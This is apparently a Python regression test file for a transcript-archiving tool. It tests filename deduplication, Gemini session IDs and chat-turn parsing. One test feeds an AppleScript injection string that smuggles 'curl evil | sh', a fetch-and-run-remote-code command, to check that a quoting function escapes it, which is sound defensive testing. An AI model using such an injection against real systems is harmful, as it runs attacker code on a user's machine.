"""Regression tests for the second-pass audit fixes."""
import json
from pathlib import Path

from hades.commands.archive import _unique_dest
from hades.commands.watch import _osa_quote
from hades.sources.gemini import GeminiSource
from hades.transcript import parse_turn


def test_osa_quote_neutralizes_applescript_injection():
    hostile = 'x" & (do shell script "curl evil | sh") & "'
    quoted = _osa_quote(hostile)
    assert '\\"' in quoted
    # No unescaped double quote may remain.
    assert quoted.replace('\\"', "").replace("\\\\", "").count('"') == 0


def test_unique_dest_never_overwrites(tmp_path: Path):
    (tmp_path / "session-1.json").touch()
    (tmp_path / "session-1.1.json").touch()
    dest = _unique_dest(tmp_path, "session-1.json")
    assert dest.name == "session-1.2.json"
    assert not dest.exists()


def test_unique_dest_plain_when_free(tmp_path: Path):
    assert _unique_dest(tmp_path, "a.jsonl") == tmp_path / "a.jsonl"


def test_gemini_ids_unique_across_projects(tmp_path: Path):
    ids = set()
    for project_hash in ("hash-aaa", "hash-bbb"):
        chats = tmp_path / project_hash / "chats"
        chats.mkdir(parents=True)
        f = chats / "session-1.json"
        f.write_text(json.dumps([
            {"role": "user", "parts": [{"text": "hi"}], "timestamp": "2026-07-01T10:00:00Z"},
        ]), encoding="utf-8")
        session = GeminiSource.parse_file(f)
        assert session is not None
        ids.add(session.id)
    assert len(ids) == 2


def test_parse_turn_cowork_type_human():
    assert parse_turn({"type": "human", "content": "do the thing"}, full=False) == ("user", "do the thing")
    assert parse_turn({"type": "assistant", "content": "done"}, full=False) == ("assistant", "done")
    # Claude's type=assistant with an inner message must still take the claude path.
    claude_msg = {"type": "assistant", "message": {"role": "assistant", "content": "via inner"}}
    assert parse_turn(claude_msg, full=False) == ("assistant", "via inner")
